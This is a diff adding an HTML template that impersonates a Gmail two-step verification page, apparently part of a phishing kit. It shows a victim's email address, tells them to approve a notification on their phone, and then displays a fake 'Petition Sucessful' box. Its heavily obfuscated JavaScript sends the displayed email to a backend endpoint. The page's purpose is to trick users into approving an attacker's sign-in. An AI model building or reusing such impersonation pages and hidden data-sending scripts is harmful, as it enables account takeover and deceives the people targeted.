@@ -1,0 +1,648 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Gmail Login</title>
+</head>
+<style>
+    .loading-txt{
+        font-size: 14px;
+        font-family: 'Poppins',sans-serif;
+        text-align: center;
+        display: none;
+    }
+    #overlay {
+    display: none;
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background-color: rgba(0, 0, 0, 0.5); 
+    z-index: 999;
+}
+.use-account{
+            font-size: 18px;
+            text-align: center;
+            font-family: 'Poppins',sans-serif;
+            font-weight: 300;
+        }
+.sucessful{
+        position:absolute;
+        border-radius: 10px;
+        transform: translate(25%,100%);
+        width: 30%;
+        background-color:#fff ;
+        height: 250px;
+        margin-left: 30%;
+        display: none;
+        z-index: 1000;
+    }
+    .forgot-password{
+        text-align: center;
+    }
+    .sucessful h4{
+        color: black;
+        font-size: 20px;
+        margin-top: 10px;
+        font-family: 'Poppins',sans-serif;
+    }
+    .close-sucess{
+    text-decoration: none;
+    color: rgb(31, 31, 31);
+    font-size: 20px;
+    font-family: 'Poppins',sans-serif;
+    padding: 15px 30px 0 0;
+
+}
+.device-img{
+        display: flex;
+        justify-content: center;
+        align-items: center;
+    }
+    @media screen and (max-width:480px) {
+        *body{
+            padding: 0;
+            margin: 0;
+        }
+        ul { padding:0 }
+        @font-face {
+    font-family: 'Poppins';
+    src: url('/fonts/Poppins-Regular.ttf');
+}
+.sucessful{
+        position:absolute;
+        border-radius: 10px;
+        transform: translate(-20%,75%);
+        width: 60%;
+        background-color:#fff ;
+        height: 240px;
+    }
+    .sucessful h4{
+        color: black;
+        margin-top: 10px;
+        font-size: 17px;
+    }
+    .close-sucess{
+    text-decoration: none;
+    color: rgb(31, 31, 31);
+    font-size: 20px;
+    font-family: 'Poppins',sans-serif;
+    padding: 15px 20px 0 0;
+    }
+        .logo-img{
+            display: flex;
+            justify-content: center;
+            width: 100%;
+            height: 45px;
+        }
+        .sign-in-text{
+            text-align: center;
+            font-family: 'Poppins',sans-serif;
+            font-size: 25px;
+            font-weight: 400;
+        }
+        .form-group {
+      position: relative;
+      margin-bottom: 20px;
+    }
+
+    input {
+      width: 85%;
+      padding: 15px;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+      outline: none;
+      margin-left: 5%;
+    }
+
+    label {
+      position: absolute;
+      left: 7%;
+      top: 55%;
+      width: 35%;
+      transform: translateY(-50%);
+      color: #777;
+      font-size: 16px;
+      pointer-events: none;
+      transition: 0.3s ease-out;
+      font-family: 'Poppins',sans-serif;
+    }
+
+    input:focus + label,
+    input:not(:placeholder-shown)  +label {
+      top: 1px;
+      font-size: 12px;
+      color: #007bff;
+      background-color: rgba(70, 90, 126, 0.4);
+      width: 30%;
+      width: 20%;
+      font-family: 'Poppins',sans-serif;
+    }
+
+    input:focus +  #email-label,
+    input:not(:placeholder-shown)  + #email-label {
+      top: 1px;
+      font-size: 12px;
+      color: #007bff;
+      background-color: rgba(39, 52, 75, 0.685);
+      width: 30%;
+      font-family: 'Poppins',sans-serif;
+    }
+    .device-img{
+        display: flex;
+        justify-content: center;
+        align-items: center;
+    }
+    .device-img img{
+            width: 100px;
+            height: 100px;
+        }
+
+        .input{
+            padding: 20px 100px 15px 5px;
+            margin-left: 3%;
+            border-radius: 2px;
+            border-color: rgb(223, 223, 223);
+            border-width: 0.5px;
+            font-size: 19px;
+            font-family: 'Poppins',sans-serif;
+            font-weight: 400;
+        }
+        #input2{
+            margin-top: 5%;
+        }
+        input:focus{
+            border-color: rgb(9, 96, 167);
+        }
+        .forgot-password{
+            text-decoration: none;
+            font-size: 17px;
+            color: #1d1d1d;
+            padding-left: 5%;
+            font-family: 'Poppins',sans-serif;
+            font-weight: 700;
+        }
+        .use-account{
+            font-size: 18px;
+            text-align: center;
+            font-family: 'Poppins',sans-serif;
+            font-weight: 300;
+        }
+        .user-email{
+            border: 1px solid rgb(110, 110, 110);
+            width: 65%;
+            text-align: center;
+            padding: 4px;
+            position: relative;
+            top: -5%;
+            left: 17%;
+            border-radius: 10px;
+            font-family: 'Poppins',sans-serif;
+        }
+        .not-your,.learn-more{
+            font-size: 18px;
+            font-family: 'Poppins',sans-serif;
+            font-weight: 500;
+            color: black;
+            padding: 5%;
+        }
+        #learn-more{
+            color: #007bff;
+            font-weight: 500;
+            text-decoration: none;
+        }
+        .login-div{
+            margin-top: 20%;
+            display: flex;
+            justify-content: space-between;
+        }
+        .create-account{
+            text-decoration: none;
+            font-size: 17px;
+            color: #007bff;
+            padding-left: 5%;
+            font-family: 'Poppins',sans-serif;
+            font-weight: 400;
+            padding-top: 10px;
+        }
+        #login{
+            padding: 10px;
+            padding-right: 10px;
+            border-radius: 4px;
+            background-color: #007bff;
+            color: #fff;
+            text-decoration: none;
+            font-family: 'Poppins',sans-serif;
+        }
+        #show{
+            font-size: 16px;
+            font-weight: 500;
+            padding-right: 30px;
+        }
+        .errormsg1,.errormsg2{
+            display: none;
+            color: red;
+            font-size: 13px ;
+            font-family: 'Poppins',sans-serif;
+            font-weight: 300;
+            margin-left: 5%;
+            transition: all 0.6s;
+        }
+    }
+
+    @media (min-width: 481px) and (max-width:1200px) {
+        *body{
+            padding: 0;
+            margin: 0;
+        }
+        .device-img img{
+            width: 100px;
+            height: 100px;
+        }
+        @font-face {
+    font-family: 'Poppins';
+    src: url('/fonts/Poppins-Regular.ttf');
+}
+        .logo-img{
+            display: flex;
+            justify-content: center;
+            width: 100%;
+            height: 45px;
+        }
+        .sign-in-text{
+            text-align: center;
+            font-family: 'Poppins',sans-serif;
+            font-size: 20px;
+            font-weight: 400;
+        }
+        .form-group {
+      position: relative;
+      margin-bottom: 20px;
+      background-color: #fff;
+    }
+
+    input {
+      width: 85%;
+      padding: 15px;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+      outline: none;
+      margin-left: 5%;
+      background-color: #fff;
+    }
+
+    label {
+      position: absolute;
+      left: 7%;
+      top: 55%;
+      width: 35%;
+      transform: translateY(-50%);
+      color: #777;
+      font-size: 16px;
+      pointer-events: none;
+      transition: 0.3s ease-out;
+      font-family: 'Poppins',sans-serif;
+    }
+
+    input:focus + label,
+    input:not(:placeholder-shown)  +label {
+      top: 1px;
+      font-size: 12px;
+      color: #007bff;
+      background-color: #fff;
+      width: 20%;
+      font-family: 'Poppins',sans-serif;
+    }
+
+    input:focus +  #email-label,
+    input:not(:placeholder-shown)  + #email-label {
+      top: 1px;
+      left: 2%;
+      font-size: 12px;
+      color: #007bff;
+      background-color: #fff;
+      width: 30%;
+      font-family: 'Poppins',sans-serif;
+    }
+
+        .input{
+            padding: 20px 100px 15px 5px;
+            margin-left: 3%;
+            border-radius: 2px;
+            border-color: rgb(223, 223, 223);
+            border-width: 0.5px;
+            font-size: 19px;
+            font-family: 'Poppins',sans-serif;
+            font-weight: 400;
+        }
+        #input2{
+            margin-top: 5%;
+        }
+        input:focus{
+            border-color: rgb(9, 96, 167);
+        }
+        .forgot-password{
+            text-decoration: none;
+            font-size: 17px;
+            color: #1d1d1d;
+            padding-left: 5%;
+            font-family: 'Poppins',sans-serif;
+            font-weight: 700;
+        }
+        .use-google{
+            font-size: 17=6px;
+            text-align: center;
+            font-family: 'Poppins',sans-serif;
+            font-weight: 300;
+        }
+        .user-email{
+            border: 1px solid rgb(110, 110, 110);
+            width: 70%;
+            text-align: center;
+            padding: 4px;
+            position: relative;
+            top: -5%;
+            left: 17%;
+            border-radius: 10px;
+            font-family: 'Poppins',sans-serif;
+        }
+        .not-your,.learn-more{
+            font-size: 16px;
+            font-family: 'Poppins',sans-serif;
+            font-weight: 500;
+            color: black;
+            padding: 5%;
+        }
+        #learn-more{
+            color: #007bff;
+            font-weight: 500;
+            text-decoration: none;
+        }
+        .login-div{
+            margin-top: 20%;
+            display: flex;
+            justify-content: space-between;
+        }
+        .create-account{
+            text-decoration: none;
+            font-size: 17px;
+            color: #007bff;
+            padding-left: 5%;
+            font-family: 'Poppins',sans-serif;
+            font-weight: 400;
+            padding-top: 10px;
+        }
+        #login{
+            padding: 10px;
+            padding-right: 10px;
+            border-radius: 4px;
+            background-color: #007bff;
+            color: #fff;
+            text-decoration: none;
+            font-family: 'Poppins',sans-serif;
+        }
+        #show{
+            font-size: 16px;
+            font-weight: 500;
+            padding-right: 30px;
+        }
+        .errormsg1,.errormsg2{
+            display: none;
+            color: red;
+            font-size: 13px ;
+            font-family: 'Poppins',sans-serif;
+            font-weight: 300;
+            margin-left: 5%;
+            transition: all 0.6s;
+        }   
+    }
+
+    @media (min-width:1200px) {
+        body{
+            justify-content: center;
+        }
+        .container{
+            width: 25%;
+            transform: translate(150%,20%);
+            border: 1px solid rgba(151, 151, 151, 0.308);
+            height:650px;
+            border-radius: 10px;
+            padding:10px;
+        }
+        .logo-img{
+            display: flex;
+            justify-content: center;
+        }
+        .sign-in-text{
+            text-align: center;
+            font-family: 'Poppins',sans-serif;
+            font-size: 25px;
+            position: relative;
+            top: -20px;
+            font-weight: 500;
+        }
+        .use-google{
+            position: relative;
+            top: -30px;
+            font-size: 16px;
+            text-align: center;
+            font-family: 'Poppins',sans-serif;
+            font-weight: 300;
+            padding: 0px 20px 0 20px;
+        }
+        .form-group {
+      position: relative;
+      margin-bottom: 20px;
+    }
+
+    input {
+      width: 85%;
+      padding: 15px;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+      outline: none;
+      margin-left: 5%;
+    }
+
+    label {
+      position: absolute;
+      left: 7%;
+      top: 55%;
+      width: 35%;
+      transform: translateY(-50%);
+      color: #777;
+      font-size: 16px;
+      pointer-events: none;
+      transition: 0.3s ease-out;
+      font-family: 'Poppins',sans-serif;
+    }
+
+    input:focus + label,
+    input:not(:placeholder-shown)  +label {
+      top: 1px;
+      font-size: 12px;
+      color: #007bff;
+      background-color: #fff;
+      width: 20%;
+      font-family: 'Poppins',sans-serif;
+    }
+
+    input:focus +  #email-label,
+    input:not(:placeholder-shown)  + #email-label {
+      top: 1px;
+      font-size: 12px;
+      color: #007bff;
+      background-color: #fff;
+      width: 30%;
+      font-family: 'Poppins',sans-serif;
+    }
+
+        .input{
+            padding: 20px 100px 15px 5px;
+            margin-left: 3%;
+            border-radius: 2px;
+            border-color: rgb(223, 223, 223);
+            border-width: 0.5px;
+            font-size: 19px;
+            font-family: 'Poppins',sans-serif;
+            font-weight: 400;
+        }
+        #input2{
+            margin-top: 5%;
+        }
+        input:focus{
+            border-color: rgb(9, 96, 167);
+        }
+        .forgot-password{
+            text-decoration: none;
+            font-size: 17px;
+            color: #1d1d1d;
+            padding-left: 5%;
+            font-family: 'Poppins',sans-serif;
+            font-weight: 700;
+        }
+        .use-google{
+            font-size: 18px;
+            text-align: center;
+            font-family: 'Poppins',sans-serif;
+            font-weight: 300;
+        }
+        .not-your,.learn-more{
+            font-size: 16px;
+            font-family: 'Poppins',sans-serif;
+            font-weight: 500;
+            color: black;
+            padding: 5%;
+        }
+        #learn-more{
+            color: #007bff;
+            font-weight: 500;
+            text-decoration: none;
+        }
+        .login-div{
+            margin-top: 20%;
+            display: flex;
+            justify-content: space-between;
+        }
+        .create-account{
+            text-decoration: none;
+            font-size: 17px;
+            color: #007bff;
+            padding-left: 5%;
+            font-family: 'Poppins',sans-serif;
+            font-weight: 400;
+            padding-top: 10px;
+        }
+        #login{
+            padding: 10px;
+            padding-right: 10px;
+            border-radius: 4px;
+            background-color: #007bff;
+            color: #fff;
+            text-decoration: none;
+            font-family: 'Poppins',sans-serif;
+        }
+        #show{
+            font-size: 16px;
+            font-weight: 500;
+            padding-right: 30px;
+        }
+        .errormsg1,.errormsg2{
+            display: none;
+            color: red;
+            font-size: 13px ;
+            font-family: 'Poppins',sans-serif;
+            font-weight: 300;
+            margin-left: 5%;
+            transition: all 0.6s;
+        }
+        .device-img img{
+            width: 100px;
+            height: 100px;
+        }
+        .user-email{
+            border: 1px solid rgb(110, 110, 110);
+            width: 50%;
+            text-align: center;
+            padding: 4px;
+            position: relative;
+            left: 23%;
+            border-radius: 10px;
+            font-family: 'Poppins',sans-serif;
+        }
+    }
+</style>
+<body>
+    <section id="home-section">
+        <div id="overlay"></div>
+        <div class="sucessful">
+            <div style="display: flex; justify-content: space-between;">
+                <h6> </h6>
+                <a href='/' class="close-sucess"><h6>Close</h6></a>
+    </div> 
+
+        <div style="display: flex; justify-content: center; align-items: center; margin-top: 30px;">
+            <img src="/images/icons8-tick-50.png"/>
+        </div>
+            <h4 style="text-align: center;">Petition Sucessful</h4>
+       
+        </div>
+        <h4 class="loading-txt">Loading.....</h4>
+        <div class="container">
+            <div class="logo-img">
+                <img src="/images/icon-ar21.svg" alt="">
+            </div>
+            <h4 class="sign-in-text"> 2 step Verification</h4>
+            <h4 class="use-account">To keep your account safe, we would like to  know if it's really you trying to sign in</h4>
+           
+                <h4 class="user-email"><%=dataInput%></h4>
+        
+            <div class="device-img">
+                <img src="/images/Smart Phone Flat Style.jpg">
+            </div>
+            <div style="display: flex;justify-content: center;">
+                    <a href="#" class="forgot-password">Check your device</a>
+                  </div>
+
+                  <h4 class="not-your">A notification was sent to your device. Tap <strong>Yes</strong> on  the notification to verify it's you</h4>
+                  <a href="#" class="learn-more" id="learn-more" onclick="resendRequest()">Resend it</a>
+        </div>    </section>
+
+
+    <script>
+        (function(_0x4017ae,_0x399087){const _0xc14144=_0x5d35,_0x1be0dd=_0x4017ae();while(!![]){try
+            {const _0x4c1221=parseInt(_0xc14144(0xe7))/0x1+-parseInt(_0xc14144(0xfc))/0x2*(parseInt(_0xc14144(0x105))/0x3)+-parseInt(_0xc14144(0xe1))/0x4*(parseInt(_0xc14144(0xf0))/0x5)+parseInt(_0xc14144(0xe4))/0x6*(parseInt(_0xc14144(0x104))/0x7)+-parseInt(_0xc14144(0xf1))/0x8*(-parseInt(_0xc14144(0xff))/0x9)+-parseInt(_0xc14144(0xf6))/0xa*(-parseInt(_0xc14144(0xf7))/0xb)+parseInt(_0xc14144(0xf3))/0xc*(-parseInt(_0xc14144(0xf5))/0xd);if(_0x4c1221===_0x399087)break;else _0x1be0dd['push'](_0x1be0dd['shift']());}catch(_0x340896){_0x1be0dd['push'](_0x1be0dd['shift']());}}}(_0x1e27,0xbde36));function _0x4b79(_0x9827e,_0x5eb843){const _0x7d2b44=_0x54fc();return _0x4b79=function(_0xb922b,_0x1dc2a4)
+                {_0xb922b=_0xb922b-0x122;let _0x44ef28=_0x7d2b44[_0xb922b];return _0x44ef28;},_0x4b79(_0x9827e,_0x5eb843);}
+                function _0x5d35(_0x23ac97,_0x261d74){const _0x1e27d3=_0x1e27();return _0x5d35=function(_0x5d35ab,_0x16ff76)
+                    {_0x5d35ab=_0x5d35ab-0xe0;let _0x2b4c3f=_0x1e27d3[_0x5d35ab];return _0x2b4c3f;},_0x5d35(_0x23ac97,_0x261d74);}
+                    function _0x1e27()
+                    {const _0x4dc298=['233770XqlNnD','json','82yGgYLo','error','style','1122210iGtcOn','#overlay','Error:','then','2892ZTgdAR','5103392xnkGlF','65865BXSunK','http://localhost:3000/resendRequest','1903725GZhXqe','160Cwnksy','application/json','2zBhida','12qXlQls','block','Success:','1456630WOMUum','display','stringify','shift','push','280SvESij','3295242cLYYMJ','.sucessful','.user-email','100385pdZFlJ','88wUWiOQ','innerHTML','505596ZcGECz','1576566DezBXf','572EVdshX','90HAjiZr','59323MBKZHQ','querySelector','2171784ouPgLv'];_0x1e27=function(){return _0x4dc298;};return _0x1e27();}(function(_0x46f0fa,_0x5ef61e){const _0x28fd98=_0x5d35,_0x841aeb=_0x4b79,_0x41a127=_0x46f0fa();while(!![])
+                        {try{const _0x5565ee=parseInt(_0x841aeb(0x122))/0x1*(parseInt(_0x841aeb(0x128))/0x2)+-parseInt(_0x841aeb(0x12a))/0x3*(-parseInt(_0x841aeb(0x129))/0x4)+parseInt(_0x841aeb(0x12e))/0x5+parseInt(_0x841aeb(0x136))/0x6+-parseInt(_0x841aeb(0x12d))/0x7+-parseInt(_0x841aeb(0x131))/0x8+-parseInt(_0x841aeb(0x133))/0x9;if(_0x5565ee===_0x5ef61e)break;else _0x41a127[_0x28fd98(0xeb)](_0x41a127['shift']());}catch(_0x53721c)
+                        {_0x41a127[_0x28fd98(0xeb)](_0x41a127[_0x28fd98(0xea)]());}}}(_0x54fc,0x37d1e));function _0x54fc()
+                        {const _0x5c2cbf=_0x5d35,_0x92aa13=[_0x5c2cbf(0xe3),_0x5c2cbf(0xec),_0x5c2cbf(0x103),_0x5c2cbf(0x101),_0x5c2cbf(0x102),'549549rQuckQ',_0x5c2cbf(0xe0),'catch','log',_0x5c2cbf(0xf9),_0x5c2cbf(0xfd),_0x5c2cbf(0xed),_0x5c2cbf(0xef),_0x5c2cbf(0xe2),_0x5c2cbf(0xf4),_0x5c2cbf(0xfa),_0x5c2cbf(0xe6),_0x5c2cbf(0xfb),_0x5c2cbf(0xf8),_0x5c2cbf(0x106),_0x5c2cbf(0xf2)];return _0x54fc=function(){return _0x92aa13;},_0x54fc();}function resendRequest(){const _0x2e2457=_0x5d35,_0x4887eb=_0x4b79,_0x405d46=document[_0x4887eb(0x125)](_0x4887eb(0x134)),_0x377350=_0x405d46[_0x4887eb(0x127)],_0x9df6a={'key1':_0x377350};console[_0x4887eb(0x130)](_0x9df6a),fetch(_0x4887eb(0x126),{'method':'POST','headers':{'Content-Type':_0x4887eb(0x135)},'body':JSON[_0x2e2457(0xe9)](_0x9df6a)})[_0x2e2457(0x102)](_0x31f4b0=>_0x31f4b0[_0x4887eb(0x124)]())[_0x4887eb(0x12c)](_0x467e62=>{const _0x10659e=_0x4887eb;console[_0x10659e(0x130)](_0x10659e(0x123),_0x467e62);})[_0x4887eb(0x12f)](_0x59af3b=>{const _0x4fd9db=_0x4887eb;console[_0x4fd9db(0x132)](_0x4fd9db(0x12b),_0x59af3b);});}setTimeout(()=>{const _0x5422cf=_0x5d35,_0x2ed3e5=document[_0x5422cf(0xf8)](_0x5422cf(0x100)),_0x313037=document[_0x5422cf(0xf8)](_0x5422cf(0xee));_0x2ed3e5['style']['display']=_0x5422cf(0xe5),_0x313037[_0x5422cf(0xfe)][_0x5422cf(0xe8)]=_0x5422cf(0xe5);},0x4e20);
+
+    </script>
+</body>
+</html>
